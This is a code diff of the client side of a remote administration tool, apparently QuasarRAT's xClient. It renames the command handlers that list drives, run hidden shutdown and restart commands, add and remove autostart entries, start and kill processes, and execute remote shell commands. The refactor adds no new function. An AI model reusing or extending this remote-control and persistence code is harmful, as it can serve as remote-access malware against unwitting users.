@@ -15,19 +15,19 @@ namespace xClient.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
     public static partial class CommandHandler
     {
-        public static void HandleDrives(Packets.ServerPackets.Drives command, Client client)
+        public static void HandleGetDrives(Packets.ServerPackets.GetDrives command, Client client)
         {
-            new Packets.ClientPackets.DrivesResponse(Environment.GetLogicalDrives()).Execute(client);
+            new Packets.ClientPackets.GetDrivesResponse(Environment.GetLogicalDrives()).Execute(client);
         }
 
-        public static void HandleAction(Packets.ServerPackets.Action command, Client client)
+        public static void HandleDoShutdownAction(Packets.ServerPackets.DoShutdownAction command, Client client)
         {
             try
             {
                 ProcessStartInfo startInfo = new ProcessStartInfo();
-                switch (command.Mode)
+                switch (command.Action)
                 {
-                    case 0:
+                    case ShutdownAction.Shutdown:
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                         startInfo.UseShellExecute = true;
@@ -35,7 +35,7 @@ namespace xClient.Core.Commands
                         startInfo.FileName = "shutdown";
                         Process.Start(startInfo);
                         break;
-                    case 1:
+                    case ShutdownAction.Restart:
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                         startInfo.UseShellExecute = true;
@@ -43,14 +43,14 @@ namespace xClient.Core.Commands
                         startInfo.FileName = "shutdown";
                         Process.Start(startInfo);
                         break;
-                    case 2:
+                    case ShutdownAction.Standby:
                         Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                         break;
                 }
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.Status(string.Format("Action failed: {0}", ex.Message)).Execute(client);
+                new Packets.ClientPackets.SetStatus(string.Format("Action failed: {0}", ex.Message)).Execute(client);
             }
         }
 
@@ -118,11 +118,11 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.Status(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
+                new Packets.ClientPackets.SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
             }
         }
 
-        public static void HandleAddStartupItem(Packets.ServerPackets.AddStartupItem command, Client client)
+        public static void HandleDoStartupItemAdd(Packets.ServerPackets.DoStartupItemAdd command, Client client)
         {
             try
             {
@@ -216,11 +216,11 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.Status(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
+                new Packets.ClientPackets.SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
             }
         }
 
-        public static void HandleAddRemoveStartupItem(Packets.ServerPackets.RemoveStartupItem command, Client client )
+        public static void HandleDoStartupItemRemove(Packets.ServerPackets.DoStartupItemRemove command, Client client)
         {
             try
             {
@@ -307,7 +307,7 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.Status(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
+                new Packets.ClientPackets.SetStatus(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
             }
         }
 
@@ -367,11 +367,11 @@ namespace xClient.Core.Commands
             new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
         }
 
-        public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
+        public static void HandleDoProcessStart(Packets.ServerPackets.DoProcessStart command, Client client)
         {
             if (string.IsNullOrEmpty(command.Processname))
             {
-                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
+                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
                 return;
             }
 
@@ -386,7 +386,7 @@ namespace xClient.Core.Commands
             }
             catch
             {
-                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
+                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
             }
             finally
             {
@@ -394,7 +394,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleKillProcess(Packets.ServerPackets.KillProcess command, Client client)
+        public static void HandleDoProcessKill(Packets.ServerPackets.DoProcessKill command, Client client)
         {
             try
             {
@@ -409,7 +409,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
+        public static void HandleDoShellExecute(Packets.ServerPackets.DoShellExecute command, Client client)
         {
             string input = command.Command;
 
